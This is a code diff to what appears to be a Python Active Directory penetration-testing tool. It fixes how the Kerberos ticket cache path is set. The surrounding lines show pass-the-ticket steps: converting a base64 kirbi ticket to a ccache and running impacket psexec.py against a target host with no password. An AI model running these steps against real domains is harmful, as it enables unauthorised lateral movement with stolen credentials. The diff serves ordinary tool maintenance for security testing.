@@ -277,8 +277,10 @@ def privCheck():
       ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
       print("\n[+] " + ticket + "\n")
       ticket = ticket.rstrip(" ")
-      if ticket != "":
-         localCOM("export KRB5CCNAME=" + ticket)
+      if ticket != "":      
+         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{ticket}.ccache"
+         print(os.environ["KRB5CCNAME"]) 
+         print("")
          print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
          if ",443," in PTS:
             remoteCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass > privcheck1.tmp")
@@ -1672,6 +1674,9 @@ while True:
       TGT = input("[?] Please enter ticket name: ")      
       if TGT != "":
          TGT = spacePadding(TGT, COL1)
+         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{TGT}"
+         print("")
+         print(os.environ["KRB5CCNAME"]) 
       else:
          TGT = BAK
       prompt()
@@ -2933,12 +2938,9 @@ while True:
       localCOM("echo " + hashTicket + " > " + userAD + ".kirbi") 
       localCOM("cat " + userAD + ".kirbi | tr -d '\n' | base64 -d > " + userAD + "_raw.kirbi")
       localCOM("impacket-ticketConverter " + userAD + "_raw.kirbi " + userAD + ".ccache")
-
-      os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{" + userAD + "}.ccache"
-      print(os.environ["KRB5CCNAME"])
-
-#      print("[i] Type this command into anther console windows....\n")
-#      print("export KRB5CCNAME=$PWD/" + userAD + ".ccache")
+      os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{userAD}.ccache"
+      print(os.environ["KRB5CCNAME"]) 
+      print("")    
       TGT = spacePadding(userAD + ".ccache", COL1)
       prompt()
       
@@ -2951,6 +2953,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '66':
+      localCOM("printenv KRB5CCNAME")
+      print("")
       localCOM(keyPath + "describeTicket.py " + TGT.rstrip(" ") + " > ticket.tmp")
       catsFile("ticket.tmp")
       prompt() 
